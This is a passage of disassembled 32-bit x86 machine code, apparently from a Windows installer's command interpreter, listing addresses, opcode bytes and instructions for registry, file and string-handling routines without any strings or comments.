  4025fc:	ff 74 24 14          	push   0x14(%esp)
  402600:	68 08 9b 40 00       	push   $0x409b08
  402605:	e9 63 f3 ff ff       	jmp    0x40196d
  40260a:	68 08 01 41 00       	push   $0x410108
  40260f:	6a e7                	push   $0xffffffe7
  402611:	e8 fb 3c 00 00       	call   0x406311
  402616:	68 60 9b 40 00       	push   $0x409b60
  40261b:	e9 79 f1 ff ff       	jmp    0x401799
  402620:	6a f0                	push   $0xfffffff0
  402622:	e8 24 0f 00 00       	call   0x40354b
  402627:	6a df                	push   $0xffffffdf
  402629:	89 44 24 50          	mov    %eax,0x50(%esp)
  40262d:	e8 19 0f 00 00       	call   0x40354b
  402632:	6a 02                	push   $0x2
  402634:	89 44 24 18          	mov    %eax,0x18(%esp)
  402638:	e8 0e 0f 00 00       	call   0x40354b
  40263d:	6a cd                	push   $0xffffffcd
  40263f:	89 44 24 54          	mov    %eax,0x54(%esp)
  402643:	e8 03 0f 00 00       	call   0x40354b
  402648:	8b d8                	mov    %eax,%ebx
  40264a:	6a 45                	push   $0x45
  40264c:	89 5c 24 4c          	mov    %ebx,0x4c(%esp)
  402650:	e8 f6 0e 00 00       	call   0x40354b
  402655:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  402659:	8b f1                	mov    %ecx,%esi
  40265b:	ff 74 24 14          	push   0x14(%esp)
  40265f:	89 44 24 28          	mov    %eax,0x28(%esp)
  402663:	8b f9                	mov    %ecx,%edi
  402665:	8b c1                	mov    %ecx,%eax
  402667:	c1 ff 0c             	sar    $0xc,%edi
  40266a:	25 00 80 00 00       	and    $0x8000,%eax
  40266f:	c1 f9 10             	sar    $0x10,%ecx
  402672:	89 44 24 24          	mov    %eax,0x24(%esp)
  402676:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
  40267c:	0f b7 c1             	movzwl %cx,%eax
  40267f:	83 e7 07             	and    $0x7,%edi
  402682:	89 74 24 20          	mov    %esi,0x20(%esp)
  402686:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40268a:	e8 08 50 00 00       	call   0x407697
  40268f:	85 c0                	test   %eax,%eax
  402691:	75 07                	jne    0x40269a
  402693:	6a 21                	push   $0x21
  402695:	e8 b1 0e 00 00       	call   0x40354b
  40269a:	ff 74 24 18          	push   0x18(%esp)
  40269e:	57                   	push   %edi
  40269f:	56                   	push   %esi
  4026a0:	53                   	push   %ebx
  4026a1:	ff 74 24 60          	push   0x60(%esp)
  4026a5:	ff 74 24 28          	push   0x28(%esp)
  4026a9:	ff 74 24 64          	push   0x64(%esp)
  4026ad:	68 c0 9b 40 00       	push   $0x409bc0
  4026b2:	e8 6d 47 00 00       	call   0x406e24
  4026b7:	83 c4 20             	add    $0x20,%esp
  4026ba:	8d 44 24 10          	lea    0x10(%esp),%eax
  4026be:	33 f6                	xor    %esi,%esi
  4026c0:	46                   	inc    %esi
  4026c1:	50                   	push   %eax
  4026c2:	68 5c ac 40 00       	push   $0x40ac5c
  4026c7:	56                   	push   %esi
  4026c8:	55                   	push   %ebp
  4026c9:	68 7c ac 40 00       	push   $0x40ac7c
  4026ce:	ff 15 b4 92 40 00    	call   *0x4092b4
  4026d4:	8b d8                	mov    %eax,%ebx
  4026d6:	85 db                	test   %ebx,%ebx
  4026d8:	0f 88 bc 00 00 00    	js     0x40279a
  4026de:	8b 44 24 10          	mov    0x10(%esp),%eax
  4026e2:	8d 54 24 28          	lea    0x28(%esp),%edx
  4026e6:	52                   	push   %edx
  4026e7:	68 6c ac 40 00       	push   $0x40ac6c
  4026ec:	50                   	push   %eax
  4026ed:	8b 08                	mov    (%eax),%ecx
  4026ef:	ff 11                	call   *(%ecx)
  4026f1:	8b d8                	mov    %eax,%ebx
  4026f3:	85 db                	test   %ebx,%ebx
  4026f5:	0f 88 95 00 00 00    	js     0x402790
  4026fb:	8b 44 24 10          	mov    0x10(%esp),%eax
  4026ff:	ff 74 24 14          	push   0x14(%esp)
  402703:	50                   	push   %eax
  402704:	8b 08                	mov    (%eax),%ecx
  402706:	ff 51 50             	call   *0x50(%ecx)
  402709:	8b d8                	mov    %eax,%ebx
  40270b:	39 6c 24 20          	cmp    %ebp,0x20(%esp)
  40270f:	75 0f                	jne    0x402720
  402711:	8b 44 24 10          	mov    0x10(%esp),%eax
  402715:	68 00 70 4d 00       	push   $0x4d7000
  40271a:	50                   	push   %eax
  40271b:	8b 08                	mov    (%eax),%ecx
  40271d:	ff 51 24             	call   *0x24(%ecx)
  402720:	85 ff                	test   %edi,%edi
  402722:	74 0b                	je     0x40272f
  402724:	8b 44 24 10          	mov    0x10(%esp),%eax
  402728:	57                   	push   %edi
  402729:	50                   	push   %eax
  40272a:	8b 08                	mov    (%eax),%ecx
  40272c:	ff 51 3c             	call   *0x3c(%ecx)
  40272f:	8b 44 24 10          	mov    0x10(%esp),%eax
  402733:	ff 74 24 18          	push   0x18(%esp)
  402737:	50                   	push   %eax
  402738:	8b 08                	mov    (%eax),%ecx
  40273a:	ff 51 34             	call   *0x34(%ecx)
  40273d:	8b 54 24 48          	mov    0x48(%esp),%edx
  402741:	66 39 2a             	cmp    %bp,(%edx)
  402744:	74 0f                	je     0x402755
  402746:	8b 44 24 10          	mov    0x10(%esp),%eax
  40274a:	ff 74 24 1c          	push   0x1c(%esp)
  40274e:	52                   	push   %edx
  40274f:	8b 08                	mov    (%eax),%ecx
  402751:	50                   	push   %eax
  402752:	ff 51 44             	call   *0x44(%ecx)
  402755:	8b 44 24 10          	mov    0x10(%esp),%eax
  402759:	ff 74 24 50          	push   0x50(%esp)
  40275d:	50                   	push   %eax
  40275e:	8b 08                	mov    (%eax),%ecx
  402760:	ff 51 2c             	call   *0x2c(%ecx)
  402763:	8b 44 24 10          	mov    0x10(%esp),%eax
  402767:	ff 74 24 24          	push   0x24(%esp)
  40276b:	50                   	push   %eax
  40276c:	8b 08                	mov    (%eax),%ecx
  40276e:	ff 51 1c             	call   *0x1c(%ecx)
  402771:	85 db                	test   %ebx,%ebx
  402773:	78 11                	js     0x402786
  402775:	8b 44 24 28          	mov    0x28(%esp),%eax
  402779:	56                   	push   %esi
  40277a:	ff 74 24 50          	push   0x50(%esp)
  40277e:	8b 08                	mov    (%eax),%ecx
  402780:	50                   	push   %eax
  402781:	ff 51 18             	call   *0x18(%ecx)
  402784:	8b d8                	mov    %eax,%ebx
  402786:	8b 44 24 28          	mov    0x28(%esp),%eax
  40278a:	50                   	push   %eax
  40278b:	8b 08                	mov    (%eax),%ecx
  40278d:	ff 51 08             	call   *0x8(%ecx)
  402790:	8b 44 24 10          	mov    0x10(%esp),%eax
  402794:	50                   	push   %eax
  402795:	8b 08                	mov    (%eax),%ecx
  402797:	ff 51 08             	call   *0x8(%ecx)
  40279a:	8b c3                	mov    %ebx,%eax
  40279c:	c1 f8 1f             	sar    $0x1f,%eax
  40279f:	83 e0 fc             	and    $0xfffffffc,%eax
  4027a2:	68 08 01 41 00       	push   $0x410108
  4027a7:	83 e8 0c             	sub    $0xc,%eax
  4027aa:	50                   	push   %eax
  4027ab:	e8 61 3b 00 00       	call   0x406311
  4027b0:	c1 eb 1f             	shr    $0x1f,%ebx
  4027b3:	e9 79 f2 ff ff       	jmp    0x401a31
  4027b8:	55                   	push   %ebp
  4027b9:	e8 8d 0d 00 00       	call   0x40354b
  4027be:	6a 11                	push   $0x11
  4027c0:	8b f0                	mov    %eax,%esi
  4027c2:	e8 84 0d 00 00       	call   0x40354b
  4027c7:	6a 23                	push   $0x23
  4027c9:	8b f8                	mov    %eax,%edi
  4027cb:	e8 7b 0d 00 00       	call   0x40354b
  4027d0:	57                   	push   %edi
  4027d1:	56                   	push   %esi
  4027d2:	68 44 9c 40 00       	push   $0x409c44
  4027d7:	89 44 24 30          	mov    %eax,0x30(%esp)
  4027db:	e8 44 46 00 00       	call   0x406e24
  4027e0:	83 c4 0c             	add    $0xc,%esp
  4027e3:	56                   	push   %esi
  4027e4:	e8 54 45 00 00       	call   0x406d3d
  4027e9:	85 c0                	test   %eax,%eax
  4027eb:	75 0d                	jne    0x4027fa
  4027ed:	55                   	push   %ebp
  4027ee:	6a f9                	push   $0xfffffff9
  4027f0:	e8 1c 3b 00 00       	call   0x406311
  4027f5:	e9 34 f2 ff ff       	jmp    0x401a2e
  4027fa:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4027fe:	56                   	push   %esi
  4027ff:	89 44 24 58          	mov    %eax,0x58(%esp)
  402803:	c7 44 24 5c 02 00 00 	movl   $0x2,0x5c(%esp)
  40280a:	00 
  40280b:	e8 b6 4b 00 00       	call   0x4073c6
  402810:	33 c9                	xor    %ecx,%ecx
  402812:	57                   	push   %edi
  402813:	66 89 4c 46 02       	mov    %cx,0x2(%esi,%eax,2)
  402818:	e8 a9 4b 00 00       	call   0x4073c6
  40281d:	33 c9                	xor    %ecx,%ecx
  40281f:	66 89 4c 47 02       	mov    %cx,0x2(%edi,%eax,2)
  402824:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  402828:	66 8b 44 24 38       	mov    0x38(%esp),%ax
  40282d:	51                   	push   %ecx
  40282e:	55                   	push   %ebp
  40282f:	89 74 24 64          	mov    %esi,0x64(%esp)
  402833:	89 7c 24 68          	mov    %edi,0x68(%esp)
  402837:	89 4c 24 76          	mov    %ecx,0x76(%esp)
  40283b:	66 89 44 24 6c       	mov    %ax,0x6c(%esp)
  402840:	e8 cc 3a 00 00       	call   0x406311
  402845:	8d 44 24 54          	lea    0x54(%esp),%eax
  402849:	50                   	push   %eax
  40284a:	ff 15 88 91 40 00    	call   *0x409188
  402850:	85 c0                	test   %eax,%eax
  402852:	0f 84 50 0b 00 00    	je     0x4033a8
  402858:	eb 93                	jmp    0x4027ed
  40285a:	81 f9 0d f0 ad 0b    	cmp    $0xbadf00d,%ecx
  402860:	0f 85 03 f7 ff ff    	jne    0x401f69
  402866:	ff 05 f4 e2 47 00    	incl   0x47e2f4
  40286c:	e9 37 0b 00 00       	jmp    0x4033a8
  402871:	68 70 9c 40 00       	push   $0x409c70
  402876:	be 08 01 41 00       	mov    $0x410108,%esi
  40287b:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  40287f:	56                   	push   %esi
  402880:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402884:	e8 27 4b 00 00       	call   0x4073b0
  402889:	56                   	push   %esi
  40288a:	bf 08 41 41 00       	mov    $0x414108,%edi
  40288f:	57                   	push   %edi
  402890:	e8 1b 4b 00 00       	call   0x4073b0
  402895:	39 6c 24 30          	cmp    %ebp,0x30(%esp)
  402899:	74 08                	je     0x4028a3
  40289b:	55                   	push   %ebp
  40289c:	e8 aa 0c 00 00       	call   0x40354b
  4028a1:	8b e8                	mov    %eax,%ebp
  4028a3:	83 7c 24 34 00       	cmpl   $0x0,0x34(%esp)
  4028a8:	74 0b                	je     0x4028b5
  4028aa:	6a 11                	push   $0x11
  4028ac:	e8 9a 0c 00 00       	call   0x40354b
  4028b1:	89 44 24 14          	mov    %eax,0x14(%esp)
  4028b5:	83 7c 24 40 00       	cmpl   $0x0,0x40(%esp)
  4028ba:	74 0b                	je     0x4028c7
  4028bc:	6a 22                	push   $0x22
  4028be:	e8 88 0c 00 00       	call   0x40354b
  4028c3:	89 44 24 18          	mov    %eax,0x18(%esp)
  4028c7:	6a cd                	push   $0xffffffcd
  4028c9:	e8 7d 0c 00 00       	call   0x40354b
  4028ce:	8b f0                	mov    %eax,%esi
  4028d0:	56                   	push   %esi
  4028d1:	57                   	push   %edi
  4028d2:	68 08 01 41 00       	push   $0x410108
  4028d7:	68 08 c1 40 00       	push   $0x40c108
  4028dc:	68 80 9c 40 00       	push   $0x409c80
  4028e1:	e8 3e 45 00 00       	call   0x406e24
  4028e6:	83 c4 14             	add    $0x14,%esp
  4028e9:	56                   	push   %esi
  4028ea:	ff 74 24 1c          	push   0x1c(%esp)
  4028ee:	ff 74 24 1c          	push   0x1c(%esp)
  4028f2:	55                   	push   %ebp
  4028f3:	ff 15 dc 90 40 00    	call   *0x4090dc
  4028f9:	e9 28 f1 ff ff       	jmp    0x401a26
  4028fe:	6a 01                	push   $0x1
  402900:	c7 44 24 28 0a 00 00 	movl   $0xa,0x28(%esp)
  402907:	00 
  402908:	e8 3e 0c 00 00       	call   0x40354b
  40290d:	6a 12                	push   $0x12
  40290f:	8b f8                	mov    %eax,%edi
  402911:	e8 35 0c 00 00       	call   0x40354b
  402916:	6a dd                	push   $0xffffffdd
  402918:	8b f0                	mov    %eax,%esi
  40291a:	e8 2c 0c 00 00       	call   0x40354b
  40291f:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  402923:	50                   	push   %eax
  402924:	68 ff 1f 00 00       	push   $0x1fff
  402929:	55                   	push   %ebp
  40292a:	8d 44 24 30          	lea    0x30(%esp),%eax
  40292e:	50                   	push   %eax
  40292f:	56                   	push   %esi
  402930:	57                   	push   %edi
  402931:	ff 15 e0 90 40 00    	call   *0x4090e0
  402937:	6a 0a                	push   $0xa
  402939:	58                   	pop    %eax
  40293a:	66 39 45 00          	cmp    %ax,0x0(%ebp)
  40293e:	0f 85 64 0a 00 00    	jne    0x4033a8
  402944:	33 f6                	xor    %esi,%esi
  402946:	33 c0                	xor    %eax,%eax
  402948:	66 89 45 00          	mov    %ax,0x0(%ebp)
  40294c:	8d 5e 01             	lea    0x1(%esi),%ebx
  40294f:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402953:	e9 50 0a 00 00       	jmp    0x4033a8
  402958:	33 ed                	xor    %ebp,%ebp
  40295a:	52                   	push   %edx
  40295b:	45                   	inc    %ebp
  40295c:	e8 45 42 00 00       	call   0x406ba6
  402961:	83 7c 24 44 00       	cmpl   $0x0,0x44(%esp)
  402966:	8b d8                	mov    %eax,%ebx
  402968:	59                   	pop    %ecx
  402969:	75 3d                	jne    0x4029a8
  40296b:	6a 02                	push   $0x2
  40296d:	e8 5c 0c 00 00       	call   0x4035ce
  402972:	8b f8                	mov    %eax,%edi
  402974:	85 ff                	test   %edi,%edi
  402976:	74 5b                	je     0x4029d3
  402978:	6a 33                	push   $0x33
  40297a:	e8 cc 0b 00 00       	call   0x40354b
  40297f:	8b f0                	mov    %eax,%esi
  402981:	56                   	push   %esi
  402982:	57                   	push   %edi
  402983:	ff 15 08 90 40 00    	call   *0x409008
  402989:	56                   	push   %esi
  40298a:	68 08 41 41 00       	push   $0x414108
  40298f:	53                   	push   %ebx
  402990:	68 c8 9c 40 00       	push   $0x409cc8
  402995:	8b e8                	mov    %eax,%ebp
  402997:	e8 88 44 00 00       	call   0x406e24
  40299c:	83 c4 10             	add    $0x10,%esp
  40299f:	57                   	push   %edi
  4029a0:	ff 15 00 90 40 00    	call   *0x409000
  4029a6:	eb 2b                	jmp    0x4029d3
  4029a8:	6a 22                	push   $0x22
  4029aa:	e8 9c 0b 00 00       	call   0x40354b
  4029af:	8b f0                	mov    %eax,%esi
  4029b1:	56                   	push   %esi
  4029b2:	53                   	push   %ebx
  4029b3:	68 04 9d 40 00       	push   $0x409d04
  4029b8:	e8 67 44 00 00       	call   0x406e24
  4029bd:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  4029c1:	83 c4 0c             	add    $0xc,%esp
  4029c4:	d1 f9                	sar    $1,%ecx
  4029c6:	51                   	push   %ecx
  4029c7:	56                   	push   %esi
  4029c8:	ff 74 24 2c          	push   0x2c(%esp)
  4029cc:	e8 b8 0b 00 00       	call   0x403589
  4029d1:	8b e8                	mov    %eax,%ebp
  4029d3:	33 db                	xor    %ebx,%ebx
  4029d5:	85 ed                	test   %ebp,%ebp
  4029d7:	0f 95 c3             	setne  %bl
  4029da:	e9 52 f0 ff ff       	jmp    0x401a31
  4029df:	8b 44 24 40          	mov    0x40(%esp),%eax
  4029e3:	89 44 24 20          	mov    %eax,0x20(%esp)
  4029e7:	8b 44 24 44          	mov    0x44(%esp),%eax
  4029eb:	6a 02                	push   $0x2
  4029ed:	89 44 24 18          	mov    %eax,0x18(%esp)
  4029f1:	e8 55 0b 00 00       	call   0x40354b
  4029f6:	6a 11                	push   $0x11
  4029f8:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4029fc:	e8 4a 0b 00 00       	call   0x40354b
  402a01:	8b 7c 24 50          	mov    0x50(%esp),%edi
  402a05:	57                   	push   %edi
  402a06:	89 44 24 20          	mov    %eax,0x20(%esp)
  402a0a:	e8 97 41 00 00       	call   0x406ba6
  402a0f:	59                   	pop    %ecx
  402a10:	89 44 24 48          	mov    %eax,0x48(%esp)
  402a14:	33 f6                	xor    %esi,%esi
  402a16:	8d 44 24 24          	lea    0x24(%esp),%eax
  402a1a:	46                   	inc    %esi
  402a1b:	50                   	push   %eax
  402a1c:	68 22 00 10 00       	push   $0x100022
  402a21:	ff 74 24 24          	push   0x24(%esp)
  402a25:	8b de                	mov    %esi,%ebx
  402a27:	57                   	push   %edi
  402a28:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  402a2c:	e8 ff 0a 00 00       	call   0x403530
  402a31:	50                   	push   %eax
  402a32:	e8 44 3e 00 00       	call   0x40687b
  402a37:	8b 7c 24 24          	mov    0x24(%esp),%edi
  402a3b:	33 c9                	xor    %ecx,%ecx
  402a3d:	85 c0                	test   %eax,%eax
  402a3f:	0f 45 f9             	cmovne %ecx,%edi
  402a42:	89 7c 24 18          	mov    %edi,0x18(%esp)
  402a46:	85 ff                	test   %edi,%edi
  402a48:	0f 84 45 01 00 00    	je     0x402b93
  402a4e:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  402a52:	bf 08 41 41 00       	mov    $0x414108,%edi
  402a57:	3b ce                	cmp    %esi,%ecx
  402a59:	75 45                	jne    0x402aa0
  402a5b:	6a 23                	push   $0x23
  402a5d:	e8 e9 0a 00 00       	call   0x40354b
  402a62:	57                   	push   %edi
  402a63:	e8 5e 49 00 00       	call   0x4073c6
  402a68:	39 74 24 14          	cmp    %esi,0x14(%esp)
  402a6c:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  402a70:	57                   	push   %edi
  402a71:	ff 74 24 2c          	push   0x2c(%esp)
  402a75:	8d 04 45 02 00 00 00 	lea    0x2(,%eax,2),%eax
  402a7c:	56                   	push   %esi
  402a7d:	ff 74 24 54          	push   0x54(%esp)
  402a81:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  402a85:	75 12                	jne    0x402a99
  402a87:	68 30 9d 40 00       	push   $0x409d30
  402a8c:	e8 93 43 00 00       	call   0x406e24
  402a91:	83 c4 14             	add    $0x14,%esp
  402a94:	e9 b3 00 00 00       	jmp    0x402b4c
  402a99:	68 70 9d 40 00       	push   $0x409d70
  402a9e:	eb ec                	jmp    0x402a8c
  402aa0:	6a 04                	push   $0x4
  402aa2:	58                   	pop    %eax
  402aa3:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  402aa7:	3b c8                	cmp    %eax,%ecx
  402aa9:	75 29                	jne    0x402ad4
  402aab:	6a 03                	push   $0x3
  402aad:	e8 5d 0a 00 00       	call   0x40350f
  402ab2:	8b 74 24 20          	mov    0x20(%esp),%esi
  402ab6:	50                   	push   %eax
  402ab7:	ff 74 24 30          	push   0x30(%esp)
  402abb:	a3 08 41 41 00       	mov    %eax,0x414108
  402ac0:	56                   	push   %esi
  402ac1:	ff 74 24 58          	push   0x58(%esp)
  402ac5:	68 c0 9d 40 00       	push   $0x409dc0
  402aca:	e8 55 43 00 00       	call   0x406e24
  402acf:	83 c4 18             	add    $0x18,%esp
  402ad2:	eb 78                	jmp    0x402b4c
  402ad4:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  402ad8:	83 f9 03             	cmp    $0x3,%ecx
  402adb:	75 6b                	jne    0x402b48
  402add:	68 00 c0 00 00       	push   $0xc000
  402ae2:	57                   	push   %edi
  402ae3:	55                   	push   %ebp
  402ae4:	ff 74 24 48          	push   0x48(%esp)
  402ae8:	e8 68 0b 00 00       	call   0x403655
  402aed:	50                   	push   %eax
  402aee:	57                   	push   %edi
  402aef:	89 44 24 54          	mov    %eax,0x54(%esp)
  402af3:	8d 84 24 98 00 00 00 	lea    0x98(%esp),%eax
  402afa:	68 80 00 00 00       	push   $0x80
  402aff:	50                   	push   %eax
  402b00:	e8 27 40 00 00       	call   0x406b2c
  402b05:	8b 54 24 24          	mov    0x24(%esp),%edx
  402b09:	8d 84 24 a0 00 00 00 	lea    0xa0(%esp),%eax
  402b10:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  402b14:	83 fa 07             	cmp    $0x7,%edx
  402b17:	50                   	push   %eax
  402b18:	ff 74 24 3c          	push   0x3c(%esp)
  402b1c:	b8 4c 9e 40 00       	mov    $0x409e4c,%eax
  402b21:	b9 28 9e 40 00       	mov    $0x409e28,%ecx
  402b26:	0f 45 c8             	cmovne %eax,%ecx
  402b29:	b8 0c 9e 40 00       	mov    $0x409e0c,%eax
  402b2e:	56                   	push   %esi
  402b2f:	ff 74 24 64          	push   0x64(%esp)
  402b33:	85 d2                	test   %edx,%edx
  402b35:	0f 45 c1             	cmovne %ecx,%eax
  402b38:	50                   	push   %eax
  402b39:	68 64 9e 40 00       	push   $0x409e64
  402b3e:	e8 e1 42 00 00       	call   0x406e24
  402b43:	83 c4 28             	add    $0x28,%esp
  402b46:	eb 04                	jmp    0x402b4c
  402b48:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  402b4c:	ff 74 24 4c          	push   0x4c(%esp)
  402b50:	57                   	push   %edi
  402b51:	ff 74 24 1c          	push   0x1c(%esp)
  402b55:	8b 7c 24 34          	mov    0x34(%esp),%edi
  402b59:	55                   	push   %ebp
  402b5a:	57                   	push   %edi
  402b5b:	ff 74 24 2c          	push   0x2c(%esp)
  402b5f:	ff 15 18 90 40 00    	call   *0x409018
  402b65:	85 c0                	test   %eax,%eax
  402b67:	75 08                	jne    0x402b71
  402b69:	8b dd                	mov    %ebp,%ebx
  402b6b:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402b6f:	eb 13                	jmp    0x402b84
  402b71:	57                   	push   %edi
  402b72:	56                   	push   %esi
  402b73:	ff 74 24 50          	push   0x50(%esp)
  402b77:	68 90 9e 40 00       	push   $0x409e90
  402b7c:	e8 a3 42 00 00       	call   0x406e24
  402b81:	83 c4 10             	add    $0x10,%esp
  402b84:	ff 74 24 18          	push   0x18(%esp)
  402b88:	ff 15 00 90 40 00    	call   *0x409000
  402b8e:	e9 15 08 00 00       	jmp    0x4033a8
  402b93:	ff 74 24 1c          	push   0x1c(%esp)
  402b97:	ff 74 24 4c          	push   0x4c(%esp)
  402b9b:	68 e8 9e 40 00       	push   $0x409ee8
  402ba0:	e8 7f 42 00 00       	call   0x406e24
  402ba5:	83 c4 0c             	add    $0xc,%esp
  402ba8:	e9 fb 07 00 00       	jmp    0x4033a8
  402bad:	68 19 00 02 00       	push   $0x20019
  402bb2:	e8 17 0a 00 00       	call   0x4035ce
  402bb7:	6a 33                	push   $0x33
  402bb9:	8b f0                	mov    %eax,%esi
  402bbb:	e8 8b 09 00 00       	call   0x40354b
  402bc0:	33 c9                	xor    %ecx,%ecx
  402bc2:	66 89 0f             	mov    %cx,(%edi)
  402bc5:	85 f6                	test   %esi,%esi
  402bc7:	0f 84 61 ee ff ff    	je     0x401a2e
  402bcd:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  402bd1:	c7 44 24 24 00 40 00 	movl   $0x4000,0x24(%esp)
  402bd8:	00 
  402bd9:	51                   	push   %ecx
  402bda:	57                   	push   %edi
  402bdb:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402bdf:	51                   	push   %ecx
  402be0:	55                   	push   %ebp
  402be1:	50                   	push   %eax
  402be2:	56                   	push   %esi
  402be3:	ff 15 14 90 40 00    	call   *0x409014
  402be9:	33 c9                	xor    %ecx,%ecx
  402beb:	41                   	inc    %ecx
  402bec:	85 c0                	test   %eax,%eax
  402bee:	75 3a                	jne    0x402c2a
  402bf0:	83 7c 24 14 04       	cmpl   $0x4,0x14(%esp)
  402bf5:	74 1c                	je     0x402c13
  402bf7:	39 4c 24 14          	cmp    %ecx,0x14(%esp)
  402bfb:	74 07                	je     0x402c04
  402bfd:	83 7c 24 14 02       	cmpl   $0x2,0x14(%esp)
  402c02:	75 26                	jne    0x402c2a
  402c04:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  402c08:	33 c0                	xor    %eax,%eax
  402c0a:	66 89 87 fe 3f 00 00 	mov    %ax,0x3ffe(%edi)
  402c11:	eb 1e                	jmp    0x402c31
  402c13:	ff 37                	push   (%edi)
  402c15:	33 db                	xor    %ebx,%ebx
  402c17:	39 5c 24 44          	cmp    %ebx,0x44(%esp)
  402c1b:	57                   	push   %edi
  402c1c:	0f 94 c3             	sete   %bl
  402c1f:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  402c23:	e8 65 41 00 00       	call   0x406d8d
  402c28:	eb 0b                	jmp    0x402c35
  402c2a:	33 c0                	xor    %eax,%eax
  402c2c:	8b d9                	mov    %ecx,%ebx
  402c2e:	66 89 07             	mov    %ax,(%edi)
  402c31:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402c35:	56                   	push   %esi
  402c36:	e9 4d ff ff ff       	jmp    0x402b88
  402c3b:	68 19 00 02 00       	push   $0x20019
  402c40:	e8 89 09 00 00       	call   0x4035ce
  402c45:	6a 03                	push   $0x3
  402c47:	8b f0                	mov    %eax,%esi
  402c49:	e8 c1 08 00 00       	call   0x40350f
  402c4e:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402c52:	59                   	pop    %ecx
  402c53:	33 c9                	xor    %ecx,%ecx
  402c55:	66 89 0f             	mov    %cx,(%edi)
  402c58:	85 f6                	test   %esi,%esi
  402c5a:	0f 84 ce ed ff ff    	je     0x401a2e
  402c60:	b9 ff 1f 00 00       	mov    $0x1fff,%ecx
  402c65:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  402c69:	39 6c 24 40          	cmp    %ebp,0x40(%esp)
  402c6d:	74 0c                	je     0x402c7b
  402c6f:	51                   	push   %ecx
  402c70:	57                   	push   %edi
  402c71:	50                   	push   %eax
  402c72:	56                   	push   %esi
  402c73:	ff 15 0c 90 40 00    	call   *0x40900c
  402c79:	eb 1e                	jmp    0x402c99
  402c7b:	55                   	push   %ebp
  402c7c:	55                   	push   %ebp
  402c7d:	55                   	push   %ebp
  402c7e:	55                   	push   %ebp
  402c7f:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  402c83:	51                   	push   %ecx
  402c84:	57                   	push   %edi
  402c85:	50                   	push   %eax
  402c86:	56                   	push   %esi
  402c87:	ff 15 10 90 40 00    	call   *0x409010
  402c8d:	33 c9                	xor    %ecx,%ecx
  402c8f:	41                   	inc    %ecx
  402c90:	85 c0                	test   %eax,%eax
  402c92:	0f 45 d9             	cmovne %ecx,%ebx
  402c95:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402c99:	33 c0                	xor    %eax,%eax
  402c9b:	66 89 87 fe 3f 00 00 	mov    %ax,0x3ffe(%edi)
  402ca2:	eb 91                	jmp    0x402c35
  402ca4:	57                   	push   %edi
  402ca5:	e8 11 48 00 00       	call   0x4074bb
  402caa:	85 c0                	test   %eax,%eax
  402cac:	0f 84 f6 06 00 00    	je     0x4033a8
  402cb2:	50                   	push   %eax
  402cb3:	ff 15 10 91 40 00    	call   *0x409110
  402cb9:	e9 ea 06 00 00       	jmp    0x4033a8
  402cbe:	6a ed                	push   $0xffffffed
  402cc0:	e8 86 08 00 00       	call   0x40354b
  402cc5:	ff 74 24 38          	push   0x38(%esp)
  402cc9:	ff 74 24 38          	push   0x38(%esp)
  402ccd:	50                   	push   %eax
  402cce:	e8 de 44 00 00       	call   0x4071b1
  402cd3:	83 f8 ff             	cmp    $0xffffffff,%eax
  402cd6:	0f 85 35 f0 ff ff    	jne    0x401d11
  402cdc:	33 c0                	xor    %eax,%eax
  402cde:	66 89 07             	mov    %ax,(%edi)
  402ce1:	e9 48 ed ff ff       	jmp    0x401a2e
  402ce6:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402cea:	33 c0                	xor    %eax,%eax
  402cec:	8b 54 24 38          	mov    0x38(%esp),%edx
  402cf0:	83 f9 38             	cmp    $0x38,%ecx
  402cf3:	89 54 24 24          	mov    %edx,0x24(%esp)
  402cf7:	0f 94 c0             	sete   %al
  402cfa:	33 f6                	xor    %esi,%esi
  402cfc:	46                   	inc    %esi
  402cfd:	89 44 24 18          	mov    %eax,0x18(%esp)
  402d01:	85 d2                	test   %edx,%edx
  402d03:	74 16                	je     0x402d1b
  402d05:	56                   	push   %esi
  402d06:	e8 04 08 00 00       	call   0x40350f
  402d0b:	66 a3 08 01 41 00    	mov    %ax,0x410108
  402d11:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402d15:	33 c6                	xor    %esi,%eax
  402d17:	59                   	pop    %ecx
  402d18:	40                   	inc    %eax
  402d19:	eb 3f                	jmp    0x402d5a
  402d1b:	83 f9 38             	cmp    $0x38,%ecx
  402d1e:	75 2b                	jne    0x402d4b
  402d20:	6a 21                	push   $0x21
  402d22:	e8 24 08 00 00       	call   0x40354b
  402d27:	68 00 20 00 00       	push   $0x2000
  402d2c:	68 08 01 41 00       	push   $0x410108
  402d31:	68 08 41 41 00       	push   $0x414108
  402d36:	e8 04 3d 00 00       	call   0x406a3f
  402d3b:	83 c4 0c             	add    $0xc,%esp
  402d3e:	68 08 01 41 00       	push   $0x410108
  402d43:	ff 15 e4 90 40 00    	call   *0x4090e4
  402d49:	eb 0f                	jmp    0x402d5a
  402d4b:	6a 11                	push   $0x11
  402d4d:	e8 f9 07 00 00       	call   0x40354b
  402d52:	50                   	push   %eax
  402d53:	e8 6e 46 00 00       	call   0x4073c6
